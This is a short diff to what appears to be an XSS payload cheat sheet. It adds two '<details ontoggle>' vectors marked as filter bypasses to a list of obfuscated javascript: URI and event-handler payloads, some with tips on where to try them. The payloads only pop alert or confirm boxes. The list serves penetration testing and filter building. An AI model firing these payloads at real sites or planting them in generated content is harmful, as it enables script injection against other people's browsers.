@@ -17,6 +17,8 @@ Please do visit as well: https://github.com/s0md3v/AwesomeXSS
 <a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>     --> Do Try this if there is HTML Injection
 <a href="javascript:alert(document.domain)">XSS</a>                                --> Do Try this if there is HTML Injection
 <a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">XSS</a>             --> Do try this one for stored XSS
+<details/open=/Open/href=/data=+ontoggle="(alert)(document.domain)
+<details/open=/Open/href=/data=;+ontoggle="(alert)(document.domain)                --> Helps bypass
 <A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
 <d3"<"/onclick="1>[confirm``]"<">z
 <d3/onmouseenter=[2].find(confirm)>z
